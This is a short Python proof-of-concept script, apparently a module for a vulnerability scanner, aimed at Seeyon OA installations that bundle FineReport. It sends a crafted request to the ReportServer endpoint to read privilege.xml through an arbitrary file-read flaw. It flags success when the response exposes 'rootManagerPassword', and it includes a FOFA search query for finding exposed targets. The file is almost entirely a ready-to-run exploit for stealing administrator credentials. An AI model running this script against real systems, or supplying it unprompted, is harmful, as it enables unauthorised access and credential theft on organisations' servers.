#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import headers

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME='Seeyon_OA_finereport_fileread'
AUTHOR="CSeroad"
REMARK='致远OA 帆软报表任意文件读取'
FOFA_RULE='title="致远A8+协同管理软件.A6"'
######################################################

def poc(target):
    result = {}
    vuln_url = target + "/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
    try:

        r1 = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
        if 'rootManagerPassword' in r1.text and r1.status_code == 200:
            result['target'] = target
            result['poc'] = NAME
            result['vuln_url'] = vuln_url
            return result
        else:
            pass
    except:
        pass

def exp(target):
    pass


if __name__ == '__main__':
    poc("https://127.0.0.1")